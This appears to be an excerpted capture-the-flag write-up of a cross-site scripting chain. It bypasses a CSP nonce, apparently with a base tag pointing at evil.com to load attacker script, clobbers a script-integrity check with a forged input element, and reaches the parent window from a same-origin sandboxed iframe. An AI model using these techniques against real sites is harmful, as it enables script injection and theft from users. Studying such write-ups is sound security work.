...
* The `integrity` check on the `files/analytics/js/frame-analytics.js` script
  is bypassed through DOM clobbering. Our injected payload also includes an
`<input name="fileIntegrity" value="...">` tag that sets `fileIntegrity.value`
to the sha256 of our own malicious javascript.
...
The text to render is passed to the iframe through the `param` query parameter,
and it gets reflected in exactly two different locations inside the iframe:

1. Between `<title>` tags:
    ```html
    <title>
        qwerty
    </title>    
...
and inject our script there. However, because the CSP is required a nonce that
we don't know, the exectution is blocked as we can see in the console:
...
href="https://evil.com/">`. The sandboxed iframe will load the script from
...
change this expected value. Where does this expected value come from? It is set
...
Because the sandboxed iframe doesn't set `allow-modals`, we're not allowed call `alert()`.

Instead of calling `alert()` inside the sandboxed iframe, we can inject a
script into the parent window. This is allowed because the sandboxed iframes
has `allow-same-origin` set, which means it has its normal origin. In this case
this is the same as the parent window since the iframe doesn't have an `src`.
...
Have the victim visite the main page and click on the link. An alert will pop
in the new tab.
...
Compute the sha256 of this page (don't forget `-L` to follow redirections):
...
Now the generated URL [https://zkkmxeqw4y9n.redir.bugpoc.ninja]() can be used to build the final [Front-End PoC](https://bugpoc.com/testers/front-end):
